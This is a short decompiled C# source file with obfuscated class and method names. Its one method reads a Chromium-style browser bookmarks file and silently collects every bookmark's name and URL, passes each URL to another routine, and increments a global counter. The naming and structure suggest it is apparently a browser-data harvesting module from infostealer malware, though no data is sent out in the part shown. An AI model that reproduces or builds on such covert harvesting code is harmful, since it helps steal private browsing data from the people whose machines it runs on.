using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using ns13;

namespace ns12;

internal sealed class Class45
{
	public static List<Struct6> smethod_0(string string_0)
	{
		try
		{
			List<Struct6> list = new List<Struct6>();
			if (!File.Exists(string_0))
			{
				return list;
			}
			string[] array = Regex.Split(Regex.Split(Regex.Split(File.ReadAllText(string_0, Encoding.UTF8), "      \"bookmark_bar\": {")[1], "      \"other\": {")[0], "},");
			foreach (string text in array)
			{
				if (!text.Contains("\"name\": \"") || !text.Contains("\"type\": \"url\",") || !text.Contains("\"url\": \"http"))
				{
					continue;
				}
				int num = 0;
				string[] array2 = Regex.Split(text, Class44.string_0);
				foreach (string string_ in array2)
				{
					num++;
					Struct6 item = default(Struct6);
					if (Class44.smethod_1(string_))
					{
						item.String_1 = Class44.smethod_2(text, num);
						item.String_0 = Class44.smethod_2(text, num + 2);
						if (!string.IsNullOrEmpty(item.String_1) && !string.IsNullOrEmpty(item.String_0) && !item.String_0.Contains("Failed to parse url"))
						{
							Class53.smethod_4(item.String_0);
							Class54.int_5++;
							list.Add(item);
						}
					}
				}
			}
			return list;
		}
		catch
		{
			return new List<Struct6>();
		}
	}
}
